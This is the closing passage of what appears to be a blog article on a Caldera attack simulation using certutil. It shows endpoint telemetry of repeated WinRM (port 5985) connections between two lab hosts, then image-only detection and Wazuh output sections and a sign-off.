"DESTINATION":{
"IP_ADDRESS":"10.1.2.20"
"PORT":5985
}
"IS_OUTGOING":1
"PROTOCOL":"tcp4"
"SOURCE":{
"IP_ADDRESS":"10.1.2.10"
"PORT":50080
}
"TIMESTAMP":1759404438554
}
{
"DESTINATION":{
"IP_ADDRESS":"10.1.2.20"
"PORT":5985
}
"IS_OUTGOING":1
"PROTOCOL":"tcp4"
"SOURCE":{
"IP_ADDRESS":"10.1.2.10"
"PORT":50081
}
"TIMESTAMP":1759404440619
}
{
"DESTINATION":{
"IP_ADDRESS":"10.1.2.20"
"PORT":5985
}
"IS_OUTGOING":1
"PROTOCOL":"tcp4"
"SOURCE":{
"IP_ADDRESS":"10.1.2.10"
"PORT":50082
}
"TIMESTAMP":1759404442671
}
{
"DESTINATION":{
"IP_ADDRESS":"10.1.2.20"
"PORT":5985
}
"IS_OUTGOING":1
"PROTOCOL":"tcp4"
"SOURCE":{
"IP_ADDRESS":"10.1.2.10"
"PORT":50083
}
"TIMESTAMP":1759404444738
}
{
"DESTINATION":{
"IP_ADDRESS":"10.1.2.20"
"PORT":5985
}
"IS_OUTGOING":1
"PROTOCOL":"tcp4"
"SOURCE":{
"IP_ADDRESS":"10.1.2.10"
"PORT":50084
}
"TIMESTAMP":1759404446788
}
]
"PARENT_PROCESS_ID":6016
"PROCESS_ID":5276
"USER_NAME":"SSNRSHNN\goadmin"
}
```

**Detection:**

**ad-dc**

![certutil](/images/calderacertutil/17.png)


![certutil](/images/calderacertutil/18.png)

Here is a Wazuh output for this attack simulation.

![certutil](/images/calderacertutil/19.png)


In this attack simulation, we explored **certutil** and its use in malicious attacks, then we saw its effects and how to detect them.

Thank you for taking the time to read this article. I hope you find it useful.

Keep up the good work.

